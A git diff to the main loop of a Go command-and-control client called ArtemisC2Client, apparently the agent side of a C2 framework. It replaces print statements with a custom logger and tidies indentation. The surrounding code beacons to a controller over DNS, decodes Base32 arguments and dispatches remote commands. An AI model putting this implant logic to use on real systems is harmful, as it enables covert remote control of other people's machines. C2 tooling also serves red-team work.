@@ -1,7 +1,6 @@
 package main
 
 import (
-	"fmt"
 	"strconv"
 	"strings"
 	"time"
@@ -11,6 +10,7 @@ import (
 	"github.com/desertcod98/ArtemisC2Client/config"
 	"github.com/desertcod98/ArtemisC2Client/dns"
 	"github.com/desertcod98/ArtemisC2Client/encoding"
+	"github.com/desertcod98/ArtemisC2Client/log"
 	"github.com/desertcod98/ArtemisC2Client/utils"
 )
 
@@ -20,7 +20,7 @@ func main() {
 	if configErr != nil {
 		agentId, handshakeErr := doHandshake()
 		if handshakeErr != nil {
-			fmt.Println("Handshake error:", handshakeErr)
+			log.Log("Handshake error:", handshakeErr)
 			return
 		}
 		cfg.AgentId = agentId
@@ -32,7 +32,7 @@ func main() {
 	cmdDispatcher := commands.NewDispatcher(ctx)
 	streamCmdDispatcher := commands.NewStreamDispatcher(ctx)
 
-	fmt.Println("Agent id:", cfg.AgentId)
+	log.Log("Agent id:", cfg.AgentId)
 
 	ticker := time.NewTicker(time.Duration(cfg.BeaconInterval) * time.Second)
 	defer ticker.Stop()
@@ -45,7 +45,7 @@ func main() {
 			ticker.Stop()
 			cfg.BeaconInterval = newBeaconInterval
 			config.SaveConfig(cfg)
-			fmt.Println("[INFO] Changed beacon interval to " + strconv.Itoa(newBeaconInterval))
+			log.Log("[INFO] Changed beacon interval to " + strconv.Itoa(newBeaconInterval))
 			ticker = time.NewTicker(time.Duration(newBeaconInterval) * time.Second)
 		}
 	}
@@ -57,7 +57,7 @@ func doHandshake() (string, error) {
 	if handshakeErr != nil {
 		return agentId, handshakeErr
 	}
-	fmt.Println("Handhsake job id:", handshakeRes)
+	log.Log("Handhsake job id:", handshakeRes)
 
 	return dns.DnsQuery(handshakeRes)
 }
@@ -65,10 +65,10 @@ func doHandshake() (string, error) {
 func doBeacon(cfg *config.Config, cmdDispatcher map[string]commands.Command, streamCmdDispatcher map[string]commands.StreamCommand) {
 	beaconRes, beaconErr := dns.DnsQuery(cfg.AgentId + ".Beacon")
 	if beaconErr != nil {
-		fmt.Println("Error:", beaconErr)
+		log.Log("Error:", beaconErr)
 		return
 	}
-	fmt.Println("Beacon response:", beaconRes)
+	log.Log("Beacon response:", beaconRes)
 
 	commandSplit := strings.Split(beaconRes, ".")
 	if len(commandSplit) < 2 {
@@ -82,14 +82,13 @@ func doBeacon(cfg *config.Config, cmdDispatcher map[string]commands.Command, str
 	var commandArgs []string
 
 	for _, arg := range commandArgsEncoded {
-			decoded, err := encoding.Base32Decode(arg)
-			if err != nil {
-					fmt.Println("Error decoding command arg:", err)
-					return
-			}
-			commandArgs = append(commandArgs, string(decoded))
+		decoded, err := encoding.Base32Decode(arg)
+		if err != nil {
+			log.Log("Error decoding command arg:", err)
+			return
+		}
+		commandArgs = append(commandArgs, string(decoded))
 	}
-
 
 	cmdType := strings.ToLower(commandType)
 
@@ -100,7 +99,7 @@ func doBeacon(cfg *config.Config, cmdDispatcher map[string]commands.Command, str
 	if streamCmd, ok := streamCmdDispatcher[cmdType]; ok {
 		go collectAndSendStreamResult(streamCmd, commandArgs, job)
 		return
-	}	
+	}
 }
 
 func collectAndSendResult(cmd commands.Command, commandArgs []string, job string) {
